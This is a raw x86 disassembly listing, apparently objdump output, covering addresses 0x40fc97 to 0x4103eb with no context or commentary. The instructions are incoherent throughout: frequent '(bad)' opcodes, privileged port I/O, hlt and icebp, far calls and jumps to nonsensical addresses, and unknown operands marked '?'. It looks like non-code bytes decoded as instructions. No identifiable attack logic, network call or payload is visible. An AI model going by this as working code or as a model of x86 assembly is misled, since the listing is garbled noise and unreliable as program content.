  40fc97:	inc    eax
  40fc98:	into   
  40fc99:	push   ecx
  40fc9a:	mov    bh,0xb9
  40fc9c:	push   ds
  40fc9d:	mov    dl,BYTE PTR [esi]
  40fc9f:	pop    ecx
  40fca0:	mov    al,0x6f
  40fca2:	test   DWORD PTR [esi-0x5a],0xc69f1a84
  40fca9:	dec    esp
  40fcaa:	mov    DWORD PTR [ecx+0x26],edx
  40fcad:	aaa    
  40fcae:	adc    ebx,DWORD PTR [ebx-0x74]
  40fcb1:	jl     0x40fc4a
  40fcb3:	lods   al,BYTE PTR ds:[esi]
  40fcb4:	outs   dx,DWORD PTR ds:[esi]
  40fcb5:	imul   esi,edi,0xb2263178
  40fcbb:	jo     0x40fc63
  40fcbd:	ret    
  40fcbe:	push   esi
  40fcbf:	stos   BYTE PTR es:[edi],al
  40fcc0:	scas   eax,DWORD PTR es:[edi]
  40fcc1:	mov    dh,0xdb
  40fcc3:	add    edx,ebx
  40fcc5:	adc    BYTE PTR [ecx-0x4],ch
  40fcc8:	jno    0x40fc6d
  40fcca:	push   0x5d
  40fccc:	mov    esp,0x818fd12e
  40fcd1:	icebp  
  40fcd2:	call   0x4ad2:0xc7b04178
  40fcd9:	ja     0x40fccd
  40fcdb:	or     eax,0x6a06ea1c
  40fce0:	in     al,0x9f
  40fce2:	outs   dx,BYTE PTR ds:[esi]
  40fce3:	sbb    eax,0x39b2de6
  40fce8:	mov    eax,ds:0xf28db338
  40fced:	(bad)  
  40fcee:	stos   DWORD PTR es:[edi],eax
  40fcef:	add    ah,dl
  40fcf1:	idiv   BYTE PTR [ebp+0x22ab6fa1]
  40fcf7:	xchg   esp,eax
  40fcf8:	cmp    eax,0xf780c5bf
  40fcfd:	loope  0x40fc96
  40fcff:	shr    ebp,0xdf
  40fd02:	mov    ?,WORD PTR [edx]
  40fd04:	pop    ds
  40fd05:	retf   0xb6e1
  40fd08:	mov    ds:0x72f73486,al
  40fd0d:	and    eax,0xc30a126e
  40fd12:	jmp    0x40fcec
  40fd14:	(bad)  
  40fd15:	xchg   edi,eax
  40fd16:	push   ecx
  40fd17:	xchg   ebx,eax
  40fd18:	mov    esp,0xc2389632
  40fd1d:	dec    edx
  40fd1e:	xchg   ebp,eax
  40fd1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd20:	xchg   BYTE PTR [ebp-0x3791dd91],dl
  40fd26:	ins    DWORD PTR es:[edi],dx
  40fd27:	adc    dh,dl
  40fd29:	adc    BYTE PTR [edx+0x66d6948c],cl
  40fd2f:	pop    es
  40fd30:	push   esi
  40fd31:	xchg   edi,eax
  40fd32:	push   0xb6c8c930
  40fd37:	les    edi,FWORD PTR [ebp-0x39]
  40fd3a:	dec    ebp
  40fd3b:	jae    0x40fcc0
  40fd3d:	push   ebp
  40fd3e:	add    BYTE PTR [ebp+0x26],dl
  40fd41:	aas    
  40fd42:	je     0x40fd65
  40fd44:	pop    ecx
  40fd45:	jl     0x40fd55
  40fd47:	jae    0x40fce4
  40fd49:	jb     0x40fceb
  40fd4b:	iret   
  40fd4c:	mov    al,0xd
  40fd4e:	push   eax
  40fd4f:	jo     0x40fdcd
  40fd51:	das    
  40fd52:	add    eax,0xd41d86c0
  40fd57:	in     al,dx
  40fd58:	ins    DWORD PTR es:[edi],dx
  40fd59:	mov    ah,0xa0
  40fd5b:	push   ecx
  40fd5c:	loope  0x40fd64
  40fd5e:	sbb    esp,DWORD PTR [eax]
  40fd60:	or     dl,al
  40fd62:	mov    al,ds:0xf634edeb
  40fd67:	mov    ds:0x50a9ab60,eax
  40fd6c:	dec    ebp
  40fd6d:	int    0x4f
  40fd6f:	ret    0xa7a3
  40fd72:	xchg   DWORD PTR [eax+0x3bf939],eax
  40fd78:	test   DWORD PTR [ecx+0x75],edi
  40fd7b:	in     eax,dx
  40fd7c:	or     eax,0xb631833c
  40fd81:	lea    edx,[esi-0x4b]
  40fd84:	out    dx,al
  40fd85:	popa   
  40fd86:	sti    
  40fd87:	iret   
  40fd88:	arpl   bp,bp
  40fd8a:	pop    ebp
  40fd8b:	xor    DWORD PTR [edx],ebx
  40fd8d:	out    dx,al
  40fd8e:	or     ch,dl
  40fd90:	sub    DWORD PTR [edi-0x2f23cee5],ebx
  40fd96:	(bad)  
  40fd97:	js     0x40fdad
  40fd99:	sbb    dl,BYTE PTR [ecx+0x73]
  40fd9c:	out    dx,al
  40fd9d:	xchg   ecx,eax
  40fd9e:	dec    eax
  40fd9f:	xchg   ebp,eax
  40fda0:	(bad)  
  40fda1:	daa    
  40fda2:	sbb    bh,ch
  40fda4:	sbb    cl,ah
  40fda6:	cmc    
  40fda7:	pop    es
  40fda8:	jne    0x40fd39
  40fdaa:	test   DWORD PTR [ebp+0x1fc4856b],0x58744207
  40fdb4:	pop    es
  40fdb5:	(bad)  [eax-0x3bb446d5]
  40fdbb:	xor    DWORD PTR [edx],ecx
  40fdbd:	aam    0x61
  40fdbf:	push   esp
  40fdc0:	in     al,0x34
  40fdc2:	rcr    DWORD PTR [esp+eax*4-0x6a],0xf
  40fdc7:	xchg   ebp,eax
  40fdc8:	(bad)  
  40fdc9:	mov    dl,0x1a
  40fdcb:	jle    0x40fddb
  40fdcd:	pop    edi
  40fdce:	xchg   ebx,eax
  40fdcf:	or     edi,ebp
  40fdd1:	pusha  
  40fdd2:	out    0x79,al
  40fdd4:	adc    edi,edx
  40fdd6:	mov    ecx,0xc7dc476c
  40fddb:	push   ecx
  40fddc:	sbb    BYTE PTR [esi],ah
  40fdde:	in     al,dx
  40fddf:	and    al,0x5b
  40fde1:	mov    al,ds:0xe003bf67
  40fde6:	cmp    DWORD PTR [edi],ebp
  40fde8:	mov    esi,0x69326e36
  40fded:	fwait
  40fdee:	(bad)  
  40fdef:	sub    DWORD PTR [eax],eax
  40fdf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdf2:	mov    ebp,0x4fe48bf2
  40fdf7:	dec    ebx
  40fdf8:	sahf   
  40fdf9:	ins    DWORD PTR es:[edi],dx
  40fdfa:	add    bh,BYTE PTR [eax-0x5acaec28]
  40fe00:	cdq    
  40fe01:	fst    QWORD PTR [esi-0x12]
  40fe04:	add    al,0x60
  40fe06:	mov    ds,WORD PTR [ecx-0x7f43f5c6]
  40fe0c:	push   ss
  40fe0d:	lar    ebp,cx
  40fe10:	ds or  eax,esi
  40fe13:	inc    edi
  40fe14:	mov    ah,0xfc
  40fe16:	mov    cl,0x24
  40fe18:	ret    0xf282
  40fe1b:	sahf   
  40fe1c:	scas   al,BYTE PTR es:[edi]
  40fe1d:	xchg   ah,dh
  40fe1f:	cmp    dh,BYTE PTR [eax]
  40fe21:	cli    
  40fe22:	aaa    
  40fe23:	sub    BYTE PTR [edi],ah
  40fe25:	xor    edi,DWORD PTR [edx+0x7d]
  40fe28:	jo     0x40fe16
  40fe2a:	clc    
  40fe2b:	fdivr  st,st(5)
  40fe2d:	add    ebp,DWORD PTR [edx]
  40fe2f:	xor    ah,BYTE PTR [esi]
  40fe31:	fisttp QWORD PTR [ebx-0x66]
  40fe34:	xchg   esp,eax
  40fe35:	and    edx,DWORD PTR [eax]
  40fe37:	in     al,dx
  40fe38:	adc    esi,esp
  40fe3a:	lds    ebp,FWORD PTR [ebp+0x7d]
  40fe3d:	hlt    
  40fe3e:	jno    0x40fe46
  40fe40:	jo     0x40fdd2
  40fe42:	(bad)  
  40fe43:	ins    DWORD PTR es:[edi],dx
  40fe44:	aaa    
  40fe45:	nop
  40fe46:	xchg   ebx,eax
  40fe47:	bound  edx,QWORD PTR [edi+0x41]
  40fe4a:	cmp    DWORD PTR [esi-0x1a22d457],edx
  40fe50:	adc    BYTE PTR ds:0x28758b49,cl
  40fe56:	or     bh,BYTE PTR [ecx]
  40fe58:	and    DWORD PTR [esi-0x35],edx
  40fe5b:	adc    BYTE PTR [eax],dl
  40fe5d:	jg     0x40fe32
  40fe5f:	xchg   DWORD PTR [ebp-0x64aaf6b2],eax
  40fe65:	clc    
  40fe66:	retf   
  40fe67:	adc    DWORD PTR [edx],ebp
  40fe69:	hlt    
  40fe6a:	arpl   WORD PTR [esi],di
  40fe6c:	ss inc eax
  40fe6e:	cwde   
  40fe6f:	xor    eax,DWORD PTR [ecx+0x4d]
  40fe72:	xchg   edi,eax
  40fe73:	xor    eax,0xdfba0612
  40fe78:	fxch   st(3)
  40fe7a:	outs   dx,DWORD PTR ds:[esi]
  40fe7b:	test   DWORD PTR [esi+esi*1],edx
  40fe7e:	dec    edx
  40fe7f:	lods   eax,DWORD PTR ds:[esi]
  40fe80:	std    
  40fe81:	outs   dx,DWORD PTR ds:[esi]
  40fe82:	pop    edi
  40fe83:	pop    esp
  40fe84:	rcr    DWORD PTR [esi],1
  40fe86:	push   ds
  40fe87:	inc    edx
  40fe88:	in     eax,0x95
  40fe8a:	jbe    0x40fe9f
  40fe8c:	jns    0x40fe0f
  40fe8e:	popa   
  40fe8f:	inc    edx
  40fe90:	std    
  40fe91:	jle    0x40fe4a
  40fe93:	test   eax,0x5b314837
  40fe98:	adc    dh,BYTE PTR [ebx-0xb0f8104]
  40fe9e:	lods   eax,DWORD PTR ds:[esi]
  40fe9f:	cmp    DWORD PTR gs:[edi],ebx
  40fea2:	jae    0x40feed
  40fea4:	cmp    BYTE PTR [eax+0x0],bl
  40fea7:	ins    BYTE PTR es:[edi],dx
  40fea8:	arpl   WORD PTR [edi-0x5d],sp
  40feab:	and    al,bh
  40fead:	(bad)  
  40feae:	pop    esi
  40feaf:	jbe    0x40fed4
  40feb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40feb2:	retf   
  40feb3:	lea    edi,[eax-0x267d21a1]
  40feb9:	inc    ebx
  40feba:	push   es
  40febb:	loopne 0x40ff39
  40febd:	jnp    0x40feb3
  40febf:	mov    bh,0xf4
  40fec1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fec2:	push   edi
  40fec3:	clc    
  40fec4:	or     al,0xd5
  40fec6:	jecxz  0x40fe58
  40fec8:	es and ecx,esi
  40fecb:	add    DWORD PTR [ebp-0x29],esp
  40fece:	cmc    
  40fecf:	stc    
  40fed0:	inc    esi
  40fed1:	and    bh,BYTE PTR [edx]
  40fed3:	retf   0x928f
  40fed6:	fsub   DWORD PTR [edi]
  40fed8:	sub    BYTE PTR [ebp-0x1d2ad40a],ah
  40fede:	dec    ebp
  40fedf:	xchg   edi,eax
  40fee0:	xor    DWORD PTR [edi],0x6581d45d
  40fee6:	dec    eax
  40fee7:	xor    eax,0x459d7027
  40feec:	ss add al,0x61
  40feef:	das    
  40fef0:	add    BYTE PTR [ebx],0xc0
  40fef3:	xlat   BYTE PTR ds:[ebx]
  40fef4:	jp     0x40ff61
  40fef6:	mov    eax,0xe56075b7
  40fefb:	pop    es
  40fefc:	sbb    eax,0xe97f17c
  40ff01:	in     eax,dx
  40ff02:	or     dl,BYTE PTR ds:0x296b03c
  40ff08:	jmp    FWORD PTR [edx+0xd6ca0f7]
  40ff0e:	lds    ecx,FWORD PTR [edx-0x4e26c3b7]
  40ff14:	inc    esi
  40ff15:	adc    eax,0x118c4030
  40ff1a:	xor    BYTE PTR [edi+0x3c80c34a],bl
  40ff20:	lds    ecx,FWORD PTR [ebx+0x34]
  40ff23:	and    DWORD PTR [ecx],eax
  40ff25:	adc    dh,BYTE PTR [esi-0x6f62fe25]
  40ff2b:	xor    cl,BYTE PTR [ebp-0x9f9f40a]
  40ff31:	(bad)  
  40ff32:	pop    ebp
  40ff33:	push   edx
  40ff34:	loop   0x40fec7
  40ff36:	pop    eax
  40ff37:	xchg   DWORD PTR [edi-0x69],eax
  40ff3a:	lea    eax,[ebx-0x44551073]
  40ff40:	mov    esi,gs
  40ff42:	aas    
  40ff43:	and    al,0xf0
  40ff45:	or     edi,DWORD PTR [ecx+0x63]
  40ff48:	neg    bh
  40ff4a:	xchg   edx,eax
  40ff4b:	mov    esp,edi
  40ff4d:	mov    DWORD PTR [esi+edx*2-0x7eb891d2],ebp
  40ff54:	cdq    
  40ff55:	or     dh,BYTE PTR [edi+0x75da366d]
  40ff5b:	cmp    esp,0x87657ace
  40ff61:	and    eax,0xb817f9a0
  40ff66:	inc    edx
  40ff67:	sar    DWORD PTR [ebx],cl
  40ff69:	jne    0x40fef7
  40ff6b:	xor    DWORD PTR [eax+0x69a084af],edi
  40ff71:	mov    eax,DWORD PTR [ebp-0x44d41040]
  40ff77:	cmp    eax,0x385e709f
  40ff7c:	add    DWORD PTR [esi],0x1cae3d09
  40ff82:	fild   DWORD PTR [eax]
  40ff84:	test   eax,0xd994c545
  40ff89:	mov    cl,0x8e
  40ff8b:	enter  0xa368,0xa
  40ff8f:	outs   dx,DWORD PTR ds:[esi]
  40ff90:	pop    esp
  40ff91:	lock fsubr QWORD PTR [ebx+ebx*1-0x34]
  40ff96:	into   
  40ff97:	inc    esi
  40ff98:	ret    
  40ff99:	mov    eax,ds:0x57441daa
  40ff9e:	xor    dl,BYTE PTR ds:0xb27c6627
  40ffa4:	ret    0xcca7
  40ffa7:	xchg   ebp,eax
  40ffa8:	lods   eax,DWORD PTR ds:[esi]
  40ffa9:	(bad)  
  40ffaa:	daa    
  40ffab:	aad    0xd9
  40ffad:	(bad)  
  40ffae:	in     eax,dx
  40ffaf:	xchg   ebp,eax
  40ffb0:	adc    DWORD PTR [esi-0x57],ebx
  40ffb3:	je     0x40ffe0
  40ffb5:	dec    edi
  40ffb6:	jo     0x40ff44
  40ffb8:	outs   dx,BYTE PTR ds:[esi]
  40ffb9:	mov    al,0x6a
  40ffbc:	ret    
  40ffbd:	or     al,0x38
  40ffbf:	xchg   esp,eax
  40ffc0:	arpl   ax,bp
  40ffc2:	sti    
  40ffc3:	addr16 mov ah,0x95
  40ffc6:	clc    
  40ffc7:	push   ds
  40ffc8:	dec    eax
  40ffc9:	pop    esi
  40ffca:	(bad)  
  40ffcb:	pop    ecx
  40ffcc:	xchg   ebp,ecx
  40ffce:	xor    bl,ah
  40ffd0:	adc    ch,BYTE PTR [ecx]
  40ffd2:	jo     0x40fff9
  40ffd4:	jp     0x410022
  40ffd6:	or     BYTE PTR [ebp-0x17],ch
  40ffd9:	jb     0x410036
  40ffdb:	inc    eax
  40ffdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffdd:	(bad)  
  40ffdf:	xchg   edi,eax
  40ffe0:	jmp    0x376ee03b
  40ffe5:	call   0x5787c4bd
  40ffea:	add    eax,0xe7374dba
  40ffef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fff0:	loope  0x40ffe1
  40fff2:	xchg   esp,eax
  40fff3:	inc    ebx
  40fff4:	mov    ch,0x56
  40fff6:	aaa    
  40fff7:	test   BYTE PTR [ebp+0xc],bl
  40fffa:	sar    esp,0xd5
  40fffd:	aam    0x95
  40ffff:	xchg   esp,eax
  410000:	sbb    DWORD PTR [edx+0x1a],edx
  410003:	shl    BYTE PTR [eax+0x71],1
  410006:	ja     0x410073
  410008:	mov    dl,0x7e
  41000a:	mov    bh,BYTE PTR [ebp+ebp*4+0x2]
  41000e:	pop    edi
  41000f:	(bad)  
  410010:	scas   al,BYTE PTR es:[edi]
  410011:	addr16 (bad) 
  410013:	sti    
  410014:	sti    
  410015:	and    BYTE PTR ds:0xfa103f18,al
  41001b:	mov    WORD PTR [edi],?
  41001d:	adc    bh,BYTE PTR [esi+0x7c]
  410020:	cld    
  410021:	push   ds
  410022:	in     eax,0x68
  410024:	and    bh,ch
  410026:	icebp  
  410027:	stos   DWORD PTR es:[edi],eax
  410028:	fld1   
  41002a:	jmp    0x40ffb2
  41002c:	call   0x2747c0c3
  410031:	pusha  
  410032:	dec    eax
  410033:	push   edi
  410034:	xchg   edx,eax
  410035:	mov    al,ds:0xead6c68c
  41003a:	xor    dl,BYTE PTR [ebp+0x12669580]
  410040:	mov    ss,WORD PTR [ebx+0x26]
  410043:	in     eax,dx
  410044:	inc    esp
  410045:	mov    esp,DWORD PTR [ebx]
  410047:	ins    BYTE PTR es:[edi],dx
  410048:	mov    ds:0x898fc672,eax
  41004d:	repnz bnd ds call 0xe6b9e00b
  410055:	in     eax,dx
  410056:	outs   dx,DWORD PTR ds:[esi]
  410057:	push   edx
  410058:	in     eax,0x7d
  41005a:	loope  0x40fffd
  41005c:	fimul  WORD PTR [ebx-0x3346af52]
  410062:	iret   
  410063:	jle    0x410012
  410065:	lea    edx,[ebx-0x6e]
  410068:	das    
  410069:	shr    eax,1
  41006b:	sub    DWORD PTR [ebp+0x5b981dbb],esi
  410071:	loop   0x410030
  410073:	lea    ebx,[eax]
  410075:	rol    DWORD PTR [edi],0x20
  410078:	stc    
  410079:	and    dh,BYTE PTR [eax]
  41007b:	sbb    ecx,ecx
  41007d:	add    al,0xbb
  41007f:	pop    ss
  410080:	scas   eax,DWORD PTR es:[edi]
  410081:	(bad)  
  410082:	je     0x4100fa
  410084:	cmp    DWORD PTR [ebp-0x80],ebx
  410087:	pop    esi
  410088:	dec    ebp
  410089:	mov    DWORD PTR [edi+ebx*4-0x51a8b57f],esi
  410090:	push   edx
  410091:	jmp    0xd67ff51
  410096:	inc    BYTE PTR [ecx-0x3f06bbfc]
  41009c:	xor    ah,BYTE PTR [esi-0xd]
  41009f:	push   0x4a70822d
  4100a4:	int    0x97
  4100a6:	and    bl,0x97
  4100a9:	xchg   ebp,eax
  4100aa:	cmp    dh,ch
  4100ac:	cmp    bl,BYTE PTR [ebp+0x24fcbeb9]
  4100b2:	xor    edi,DWORD PTR [edi+esi*8]
  4100b5:	sbb    edx,DWORD PTR [ebx]
  4100b7:	pop    ebp
  4100b8:	addr16 and ebp,edx
  4100bb:	add    edx,DWORD PTR [edi+0x98a1e78]
  4100c1:	cmp    bh,ah
  4100c3:	mov    esp,0x5629693b
  4100c8:	aaa    
  4100c9:	or     al,0xa6
  4100cb:	push   esp
  4100cc:	add    bh,0xc9
  4100cf:	ds cmp eax,0xf1c34b2e
  4100d5:	dec    ecx
  4100d6:	loop   0x4100f0
  4100d8:	add    bl,al
  4100da:	pusha  
  4100db:	stc    
  4100dc:	retf   0xf04d
  4100df:	rcr    BYTE PTR ds:0x8688f240,1
  4100e5:	adc    dh,BYTE PTR [eax+ebx*8+0xcdf1b61]
  4100ec:	into   
  4100ed:	xor    bl,BYTE PTR [ecx]
  4100ef:	jecxz  0x4100d0
  4100f1:	jno    0x410162
  4100f3:	je     0x4100e3
  4100f5:	icebp  
  4100f6:	jl     0x4100b9
  4100f8:	stos   BYTE PTR es:[edi],al
  4100f9:	pop    ecx
  4100fa:	mov    edi,0x5ee489ee
  4100ff:	cs xchg ecx,eax
  410101:	sti    
  410102:	adc    ebx,ebp
  410104:	mov    ah,0xde
  410106:	mov    edx,0x76054148
  41010b:	leave  
  41010c:	imul   edi,DWORD PTR cs:[ecx+0x421d3e5e],0x426675f
  410117:	into   
  410118:	(bad)  [esi]
  41011a:	cmp    BYTE PTR [edx+edx*4],bh
  41011d:	xor    al,0x9
  41011f:	sbb    BYTE PTR ds:0x65109f6,ch
  410125:	push   ecx
  410126:	dec    ebp
  410127:	out    dx,al
  410128:	xor    eax,0x7f1a14a5
  41012d:	jno    0x4100b3
  41012f:	jge    0x41012b
  410131:	dec    ecx
  410132:	mov    edi,0x20b79822
  410137:	or     ch,BYTE PTR [ebp+0x557e536a]
  41013d:	ret    
  41013e:	imul   eax,DWORD PTR [eax+0x12fbaf91],0xde05da3e
  410148:	sub    al,BYTE PTR [eax-0x3]
  41014b:	xor    eax,DWORD PTR [eax]
  41014d:	ficom  DWORD PTR [eax-0x3a]
  410150:	(bad)  
  410151:	call   0xbbd3:0x3a4dd48a
  410158:	pop    esi
  410159:	xor    ecx,ecx
  41015b:	sti    
  41015c:	or     bl,BYTE PTR [ebp-0x8640c0]
  410162:	sbb    edi,esi
  410164:	test   al,0x80
  410166:	adc    DWORD PTR [edx],0x74904ae6
  41016c:	push   ebp
  41016d:	js     0x4101a3
  41016f:	nop
  410170:	sbb    dl,BYTE PTR [ebx+edx*8-0x22]
  410174:	dec    edx
  410175:	loopne 0x4101ce
  410177:	xor    dh,BYTE PTR [edx+0x11b13b77]
  41017d:	xchg   edi,eax
  41017e:	pop    eax
  41017f:	outs   dx,DWORD PTR ds:[esi]
  410180:	and    BYTE PTR [edi-0x7297223f],dh
  410186:	jg     0x41018d
  410188:	xchg   DWORD PTR [ecx],ebx
  41018a:	pop    esp
  41018b:	mov    eax,ds:0x51570ff5
  410190:	psllw  mm0,0x94
  410194:	test   al,0x3e
  410196:	xlat   BYTE PTR ds:[ebx]
  410197:	xchg   esi,eax
  410198:	sbb    ebx,DWORD PTR [edx-0x6d7bbc38]
  41019e:	add    eax,0xd0358f81
  4101a3:	hlt    
  4101a4:	in     eax,0x6b
  4101a6:	outs   dx,DWORD PTR ds:[esi]
  4101a7:	cmp    eax,0x18621b14
  4101ac:	scas   al,BYTE PTR es:[edi]
  4101ad:	out    0xf4,eax
  4101af:	stc    
  4101b0:	fs ins BYTE PTR es:[edi],dx
  4101b2:	pop    edx
  4101b3:	(bad)  [esi+ecx*1]
  4101b6:	scas   eax,DWORD PTR es:[edi]
  4101b7:	sahf   
  4101b8:	jmp    0x9980a0ab
  4101bd:	stos   DWORD PTR es:[edi],eax
  4101be:	cmc    
  4101bf:	dec    ebp
  4101c0:	push   esi
  4101c1:	jno    0x4101d7
  4101c3:	cmp    cl,BYTE PTR [edi+0x70]
  4101c6:	fcom   DWORD PTR [ecx+0x73d43be2]
  4101cc:	or     DWORD PTR [esi-0x6111b1a6],ebp
  4101d2:	sahf   
  4101d3:	imul   ecx,DWORD PTR [edx+0x5a243398],0x38cc94ff
  4101dd:	push   0xffffffb8
  4101df:	fmul   st,st(4)
  4101e1:	add    eax,0x6632297c
  4101e6:	adc    bh,BYTE PTR [edi+0x45f722b]
  4101ec:	(bad)  
  4101ed:	xor    ebx,ecx
  4101ef:	or     al,0x78
  4101f1:	mov    eax,ds:0xa165bd44
  4101f6:	cli    
  4101f7:	pop    ebx
  4101f8:	sbb    BYTE PTR [ecx+0x3b],cl
  4101fb:	sbb    BYTE PTR [ecx],ch
  4101fd:	les    edx,FWORD PTR ds:0x4a6b993e
  410203:	gs das 
  410205:	fdiv   DWORD PTR [ecx]
  410207:	sbb    DWORD PTR [edi],esi
  410209:	or     esp,DWORD PTR [eax]
  41020b:	or     dh,cl
  41020d:	scas   eax,DWORD PTR es:[edi]
  41020e:	in     eax,0x6e
  410210:	lods   al,BYTE PTR ds:[esi]
  410211:	xor    DWORD PTR [ebx-0x41],esp
  410214:	mov    ebx,0xfc92d567
  410219:	add    al,0x6f
  41021b:	cmp    ah,dh
  41021d:	fadd   st,st(3)
  41021f:	frstor [edi]
  410221:	pop    es
  410222:	(bad)  
  410223:	push   esi
  410224:	stc    
  410225:	gs pusha 
  410227:	dec    esi
  410228:	lods   eax,DWORD PTR ds:[esi]
  410229:	push   esp
  41022a:	push   cs
  41022b:	mov    al,0xa4
  41022d:	popa   
  41022e:	dec    ebx
  41022f:	jmp    0x5f704d32
  410234:	retf   
  410235:	pop    DWORD PTR [edi+0xf]
  410238:	and    edi,DWORD PTR [ebp+0x1d6be3b3]
  41023e:	in     al,dx
  41023f:	xchg   esi,eax
  410240:	push   ebp
  410241:	stos   BYTE PTR es:[edi],al
  410242:	jnp    0x4102a4
  410244:	mov    ecx,0xcf247b8b
  410249:	mov    edx,0xacb66115
  41024e:	mov    dl,0x8f
  410250:	addr16 xor al,0x2
  410253:	fild   QWORD PTR [edi-0x22289c19]
  410259:	js     0x4102d5
  41025b:	pop    es
  41025c:	loope  0x41029b
  41025e:	xchg   DWORD PTR [esi],edx
  410260:	mov    ah,0x11
  410262:	pop    es
  410263:	or     esp,DWORD PTR [eax+0x2f]
  410266:	dec    esp
  410267:	not    eax
  410269:	push   ebx
  41026a:	adc    DWORD PTR [edx+0x63b7a3dd],eax
  410270:	jecxz  0x410218
  410272:	outs   dx,BYTE PTR ds:[esi]
  410273:	mov    edi,0xbb6ccab6
  410278:	pop    esp
  410279:	adc    eax,0x7be13342
  41027e:	out    0x76,eax
  410280:	xchg   esi,eax
  410281:	cdq    
  410282:	pop    ebx
  410283:	stc    
  410284:	pop    ss
  410285:	int    0x27
  410287:	and    cl,BYTE PTR [eax+0x58]
  41028a:	mov    cl,BYTE PTR [esi]
  41028c:	bound  esi,QWORD PTR [edi+0x31]
  41028f:	out    0xce,eax
  410291:	sbb    BYTE PTR [eax+0x21],dl
  410294:	mov    eax,edx
  410296:	dec    ecx
  410298:	imul   BYTE PTR [edx]
  41029a:	and    ecx,DWORD PTR [ecx]
  41029c:	out    dx,eax
  41029d:	mov    WORD PTR ds:0xbf7d0827,cs
  4102a3:	mov    DWORD PTR [ecx+0x5d],esp
  4102a6:	mov    dh,0x9e
  4102a8:	les    edx,FWORD PTR [ecx+0x5a]
  4102ab:	xchg   DWORD PTR [ebx-0xd5bc0ed],eax
  4102b1:	dec    eax
  4102b2:	mov    ss,WORD PTR [edi+0x0]
  4102b5:	add    DWORD PTR [esi],0x1319d3a9
  4102bb:	sub    al,0x1d
  4102bd:	sbb    dl,BYTE PTR [eax-0x25]
  4102c0:	out    0xb4,al
  4102c2:	cmc    
  4102c3:	(bad)  
  4102c4:	push   cs
  4102c5:	aad    0x2b
  4102c7:	pop    esp
  4102c8:	ins    BYTE PTR es:[edi],dx
  4102c9:	test   dl,0x1c
  4102cc:	mov    bl,0x12
  4102ce:	or     edx,DWORD PTR [esi-0x18]
  4102d1:	mov    esp,0xe25b1bc8
  4102d6:	outs   dx,BYTE PTR ds:[esi]
  4102d7:	jg     0x4102b2
  4102d9:	jmp    FWORD PTR [edi+0x15]
  4102dc:	ss cld 
  4102de:	ret    0x3ca9
  4102e1:	mov    esp,0x11f7a161
  4102e6:	jae    0x41030b
  4102e8:	jbe    0x4102c5
  4102ea:	jno    0x41031e
  4102ec:	stos   DWORD PTR es:[edi],eax
  4102ed:	cmp    eax,0x41d9f1be
  4102f2:	das    
  4102f3:	xlat   BYTE PTR ds:[ebx]
  4102f4:	xchg   esp,eax
  4102f5:	test   eax,0x1bad528f
  4102fa:	test   DWORD PTR [ebp-0x1a3c97b3],edi
  410300:	in     al,0x15
  410302:	ins    DWORD PTR es:[edi],dx
  410303:	add    eax,0x70b3a02
  410308:	pop    esi
  410309:	add    BYTE PTR [ecx-0x43],al
  41030c:	pusha  
  41030d:	rcl    BYTE PTR [edi],1
  41030f:	or     bl,BYTE PTR [ecx-0x6b]
  410312:	clc    
  410313:	ds mov al,0x22
  410316:	add    edx,0x61
  410319:	push   cs
  41031a:	jnp    0x410339
  41031c:	imul   ecx,DWORD PTR [eax+0x12],0x7e4ffc5c
  410323:	xlat   BYTE PTR ds:[ebx]
  410324:	pushf  
  410325:	add    edx,ebp
  410327:	scas   al,BYTE PTR es:[edi]
  410328:	scas   al,BYTE PTR es:[edi]
  410329:	(bad)  
  41032a:	mov    ds,esp
  41032c:	mov    ebx,0xddd3f2cd
  410331:	sub    al,0x66
  410333:	sub    al,0x43
  410335:	mov    eax,ds:0xb518b870
  41033a:	jge    0x410379
  41033c:	xor    edx,edx
  41033e:	or     eax,0x776ea64f
  410343:	inc    edx
  410344:	jno    0x41037e
  410346:	inc    ebp
  410347:	lock inc edx
  410349:	outs   dx,DWORD PTR ds:[esi]
  41034a:	mov    esi,0x9ff088b7
  41034f:	pop    edx
  410350:	add    edi,DWORD PTR [edi-0x62105d66]
  410356:	sbb    ebp,esi
  410358:	sub    BYTE PTR [ebp+0x76],ch
  41035b:	mov    esp,0xb8b35e
  410360:	mov    dh,0xba
  410362:	jmp    0x2c6720d8
  410367:	pop    esi
  410368:	mov    DWORD PTR [edi+0x497546ff],ebp
  41036e:	call   0xfda13c6d
  410373:	mov    cl,0x3
  410375:	push   DWORD PTR [eax-0x316826d7]
  41037b:	push   ebx
  41037c:	(bad)  
  41037d:	push   ebp
  41037e:	call   FWORD PTR [edi+0x717312ed]
  410384:	jbe    0x410394
  410386:	(bad)  
  410387:	dec    ebx
  410388:	mov    fs,WORD PTR [ebp+0x68]
  41038b:	sbb    ecx,esp
  41038d:	mov    ebx,ds
  41038f:	mov    dl,0xf2
  410391:	add    ah,BYTE PTR [bx+di+0x2e]
  410395:	mov    esi,DWORD PTR [edx+ebx*2+0x21]
  410399:	fdivr  DWORD PTR [edx-0x36]
  41039c:	leave  
  41039d:	mul    DWORD PTR [edi]
  41039f:	xor    cl,ah
  4103a1:	call   FWORD PTR [eax-0x24937fae]
  4103a7:	ja     0x41037b
  4103a9:	popf   
  4103aa:	retf   
  4103ab:	or     BYTE PTR [edi],al
  4103ad:	mov    ch,0xca
  4103af:	dec    esp
  4103b0:	fbld   TBYTE PTR [edx+0x156d6eaf]
  4103b7:	push   es
  4103b8:	adc    BYTE PTR [edx-0x5f],ah
  4103bb:	popa   
  4103bc:	retf   
  4103bd:	mov    al,ds:0x5279e676
  4103c2:	and    ebp,DWORD PTR [edi]
  4103c4:	cmp    ebp,DWORD PTR [edx]
  4103c6:	dec    esp
  4103c7:	sbb    DWORD PTR [edx+0x2d7c1581],ebx
  4103cd:	xchg   esi,eax
  4103ce:	dec    ecx
  4103cf:	mov    eax,0xce29bbc1
  4103d4:	not    bl
  4103d6:	stos   BYTE PTR es:[edi],al
  4103d7:	aaa    
  4103d8:	fist   WORD PTR [edx]
  4103da:	nop
  4103db:	and    ebx,ecx
  4103dd:	in     eax,dx
  4103de:	xor    DWORD PTR [edi+0x36812ae2],ebx
  4103e4:	push   cs
  4103e5:	fisubr DWORD PTR [eax-0x2c3ff024]
  4103eb:	adc    DWORD PTR gs:[ebp-0x29],edx
